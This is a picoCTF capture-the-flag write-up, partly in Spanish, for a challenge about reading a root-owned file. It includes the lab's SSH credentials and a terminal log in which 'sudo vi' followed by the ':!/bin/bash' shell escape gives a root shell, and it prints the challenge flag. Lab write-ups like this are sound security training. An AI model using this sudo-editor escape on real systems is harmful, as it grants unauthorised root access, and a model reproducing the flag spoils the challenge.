Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 65407 picoplayer@saturn.picoctf.net` Password: `UYiOazkqY2` Can you login and read the root file?

Hints
- What permissions do you have?
# Solucion
Se conecta a la cuenta indicada en la descripcion, se crea un archivo como administrador usando sudo vi y al salir del archivo se pone el comando esc + :!/bin/bash
Ahora estamos en la cuenta raiz, asi que ahora nos movemos al directorio raiz y vemos los archivos, finalmente se lee el archivo .txt usando cat y ahi aparece la bandera
```
diegojfh1000-picoctf@webshell:~$ ssh -p 65407 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65407 ([13.59.203.175]:65407)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:65407' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
picoplayer@challenge:~$ sudo vi test
[sudo] password for picoplayer: 

[No write since last change]
root@challenge:/home/picoplayer# cd /root/
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 19 22:37 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}